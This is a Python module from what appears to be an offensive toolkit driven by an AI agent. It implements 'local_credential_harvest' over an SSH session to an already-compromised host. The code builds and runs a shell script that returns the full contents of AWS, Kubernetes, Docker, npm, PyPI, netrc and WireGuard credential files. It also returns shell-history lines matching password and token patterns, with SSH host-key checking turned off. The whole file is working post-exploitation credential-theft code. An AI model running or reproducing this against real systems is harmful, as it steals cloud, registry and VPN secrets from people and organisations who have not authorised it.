"""
Subprocess execution for local_credential_harvest: one SSH session to a
host already reached via some other foothold, running one fixed,
bounded shell script that checks a known list of credential-bearing
files under the login user's home directory. No parsing logic here --
see parse.py.

Follows the same sshpass-driven single-attempt pattern as the linpeas
adapter: ``sshpass`` supplies the single password for a non-interactive
``ssh`` session. Unlike linpeas, the remote command is not a download
pipe -- it is the fixed script built by ``build_remote_script()`` below,
which is read-only (``test``, ``head``, ``wc``, ``grep``, ``cut``,
``tail``) and never writes, deletes, or changes permissions on the
remote host.
"""
from __future__ import annotations

import shutil
import subprocess
from typing import List, Optional, Tuple

from tradecraft.adapters.local_credential_harvest import parse as ch_parse

DEFAULT_TIMEOUT = 60

# Fixed checklist: (label, path, kind). A path starting with '/' is used
# as-is (an absolute, system-wide location); any other path is relative
# to $HOME (the login user's own files). Kinds:
#   text         -- small structured credential file, content returned
#                   (capped at parse.MAX_TEXT_BYTES on the remote side)
#   private_key  -- only the PEM/OpenSSH header line is ever printed;
#                   the key body never leaves the remote host
#   history      -- only lines matching HISTORY_PATTERN are printed
#
# The WireGuard entries are absolute and system-wide (wg-quick's own
# default location, not per-user) -- unlike every other entry here, a
# non-root login will very commonly see these as "unreadable" rather
# than "present", which is itself a meaningful, correctly-reported
# result (confirms the current privilege level, not a tool defect).
# WireGuard has no separate private-key kind: its key is one base64
# line embedded in an otherwise small, non-sensitive INI-style config,
# so there is no clean way to redact just the key the way an SSH
# private-key file's PEM body is redacted -- the whole small file is
# returned as "text", the same as .aws/credentials or .kube/config.
CREDENTIAL_FILES: Tuple[Tuple[str, str, str], ...] = (
    ("ssh_id_rsa", ".ssh/id_rsa", "private_key"),
    ("ssh_id_ed25519", ".ssh/id_ed25519", "private_key"),
    ("ssh_id_ecdsa", ".ssh/id_ecdsa", "private_key"),
    ("aws_credentials", ".aws/credentials", "text"),
    ("aws_config", ".aws/config", "text"),
    ("kube_config", ".kube/config", "text"),
    ("docker_config", ".docker/config.json", "text"),
    ("npmrc", ".npmrc", "text"),
    ("pypirc", ".pypirc", "text"),
    ("netrc", ".netrc", "text"),
    ("bash_history", ".bash_history", "history"),
    ("zsh_history", ".zsh_history", "history"),
    ("wireguard_wg0", "/etc/wireguard/wg0.conf", "text"),
    ("wireguard_wg1", "/etc/wireguard/wg1.conf", "text"),
)

# Extended-regex (grep -E -i) for history lines that look like they pass
# a credential on the command line or in an environment assignment.
HISTORY_PATTERN = (
    r"password|passwd|secret|token|api[_-]?key|authorization|sshpass|"
    r"PGPASSWORD|mysql .*-u.*-p|mysql .*-p|"
    r"[[:space:]]-p[[:space:]]+[^[:space:]-]"
)

_TEXT_BYTES = ch_parse.MAX_TEXT_BYTES
_HISTORY_LINES = ch_parse.MAX_HISTORY_LINES
_HISTORY_LINE_CHARS = 500


def _file_block(label: str, rel: str, kind: str) -> str:
    """Shell snippet that emits one marker-delimited block for one path."""
    begin = (
        f'{ch_parse.BEGIN_PREFIX} {label} '
    )
    if rel.startswith("/"):
        file_expr = rel
        display_path = rel
    else:
        file_expr = f"$HOME/{rel}"
        display_path = f"~/{rel}"
    lines = [
        f'f="{file_expr}"',
        f'if [ ! -e "$f" ]; then',
        f'  echo "{begin}absent 0 {kind} {display_path}"',
        f'elif [ ! -f "$f" ] || [ ! -r "$f" ]; then',
        f'  echo "{begin}unreadable 0 {kind} {display_path}"',
        f'else',
        f'  size=$(wc -c < "$f" | tr -d " ")',
    ]
    if kind == "private_key":
        lines += [
            '  hdr=$(head -n 1 "$f")',
            '  case "$hdr" in',
            '    "-----BEGIN "*"PRIVATE KEY-----")',
            f'      echo "{begin}present $size {kind} {display_path}"',
            '      echo "$hdr"',
            '      ;;',
            '    *)',
            f'      echo "{begin}not_key_material $size {kind} {display_path}"',
            '      ;;',
            '  esac',
        ]
    elif kind == "text":
        lines += [
            f'  echo "{begin}present $size {kind} {display_path}"',
            f'  head -c {_TEXT_BYTES} "$f"',
            '  printf "\\n"',
        ]
    else:  # history
        lines += [
            f'  echo "{begin}present $size {kind} {display_path}"',
            f'  grep -E -i -- "{HISTORY_PATTERN}" "$f" 2>/dev/null'
            f' | cut -c1-{_HISTORY_LINE_CHARS} | tail -n {_HISTORY_LINES}',
        ]
    lines += [
        "fi",
        f'echo "{ch_parse.END_PREFIX} {label}"',
    ]
    return "\n".join(lines)


def build_remote_script() -> str:
    """Builds the single fixed POSIX-sh script run over SSH.

    Every path comes from the module-level CREDENTIAL_FILES checklist --
    nothing model-chosen is interpolated into the script.
    """
    parts = [
        "LC_ALL=C",
        "export LC_ALL",
    ]
    for label, rel, kind in CREDENTIAL_FILES:
        parts.append(_file_block(label, rel, kind))
    parts.append(f"echo {ch_parse.DONE_MARKER}")
    return "\n".join(parts) + "\n"


REMOTE_CMD = build_remote_script()


def find_sshpass_binary() -> Optional[str]:
    """Finds the sshpass binary on PATH."""
    return shutil.which("sshpass")


def build_argv(
    target: str,
    ssh_user: str,
    ssh_pass: str,
    binary: str = "sshpass",
) -> List[str]:
    """Builds argv for one ``sshpass ssh ... <script>`` run."""
    host, port = ch_parse.parse_host_port(target)

    argv = [
        binary,
        "-p",
        ssh_pass,
        "ssh",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
    ]
    if port is not None:
        argv.extend(["-p", str(port)])
    argv.append(f"{ssh_user}@{host}")
    argv.append(REMOTE_CMD)
    return argv


def execute(
    target: str,
    ssh_user: str,
    ssh_pass: str,
    timeout: Optional[int] = None,
    runner=None,
) -> ch_parse.RawHarvestResult:
    """Executes one credential-harvest run over a single SSH session."""
    host, _ = ch_parse.parse_host_port(target)
    if not host:
        return ch_parse.RawHarvestResult(
            target=(target or "").strip(), error="empty target host"
        )

    if not (ssh_user or "").strip():
        return ch_parse.RawHarvestResult(
            target=host, error="ssh_user is required for local_credential_harvest"
        )
    if not (ssh_pass or "").strip():
        return ch_parse.RawHarvestResult(
            target=host, error="ssh_pass is required for local_credential_harvest"
        )

    binary = find_sshpass_binary()
    if binary is None:
        return ch_parse.RawHarvestResult(
            target=host, error="sshpass binary not found on PATH"
        )

    if timeout is None:
        timeout = DEFAULT_TIMEOUT

    argv = build_argv(
        target=target, ssh_user=ssh_user, ssh_pass=ssh_pass, binary=binary
    )

    run_cmd = runner or subprocess.run

    try:
        proc = run_cmd(
            argv,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return ch_parse.RawHarvestResult(
            target=host,
            error=f"local_credential_harvest execution timed out after {timeout}s",
        )
    except Exception as exc:  # noqa: BLE001 - surfaced to the model as a tool error
        return ch_parse.RawHarvestResult(
            target=host, error=f"local_credential_harvest execution failed: {exc}"
        )

    return ch_parse.RawHarvestResult(
        target=host,
        stdout=proc.stdout or "",
        stderr=proc.stderr or "",
        returncode=proc.returncode,
    )
